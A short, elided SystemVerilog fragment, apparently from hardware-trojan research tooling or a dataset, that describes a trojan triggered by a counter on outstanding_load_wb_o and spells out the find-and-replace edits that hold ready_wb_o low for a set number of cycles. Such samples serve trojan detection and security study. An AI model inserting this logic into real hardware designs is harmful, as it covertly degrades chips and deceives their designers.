 ...
 *   
 * Trigger: Counter on outstanding_load_wb_o
 * Payload: Delay ready_wb_o by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && outstanding_load_wb_o) begin
...
// ============================================================
// Performance Degradation: Delay ready_wb_o by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF ready_wb_o is a ready/valid signal:
//   Find: assign ready_wb_o = ready_condition;
//   Replace: assign ready_wb_o = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF ready_wb_o is in always_ff:
//   Find: ready_wb_o <= ready_value;
//   Replace: ready_wb_o <= (delay_counter == 0) ? ready_value : 1'b0;